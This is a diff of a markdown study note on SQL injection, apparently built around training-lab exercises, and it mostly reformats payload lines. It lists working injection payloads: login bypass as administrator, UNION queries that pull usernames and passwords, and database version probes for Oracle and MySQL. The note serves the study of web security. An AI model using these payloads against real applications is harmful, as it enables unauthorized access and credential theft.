@@ -13,7 +13,9 @@
 `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1` 
 ### Subverting application logic, where you can change a query to interfere with the application's logic
  If a users credential is wiener:bluecheese 
-`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'` `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''` 
+
+`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'` 
+`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''` 
 ### UNION attacks, where you can retrieve data from different database tables 
 `SELECT name, description FROM products WHERE category = 'Gifts'` `' UNION SELECT username, password FROM users--` 
 This will cause the application to return all usernames and passwords along with the names and descriptions of products. Examining the database, where you can extract information about the version and structure of the database 
@@ -31,7 +33,8 @@ Mostly by using parameterized queries (prepared statements) instead of string co
 ###### SQL injection UNION attack, retrieving multiple values in a single column
 `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` 
 ###### SQL injection attack, querying the database type and version on Oracle 
-`'+UNION+SELECT+'abc','def'+FROM+dual--` `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--` 
+`'+UNION+SELECT+'abc','def'+FROM+dual--`
+`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--` 
 ###### SQL injection attack, querying the database type and version on MySQL and Microsoft 
 `'+UNION+SELECT+'abc','def'#` `'+UNION+SELECT+@@version,+NULL#` 
 ###### SQL injection attack, listing the database contents on non-Oracle databases 
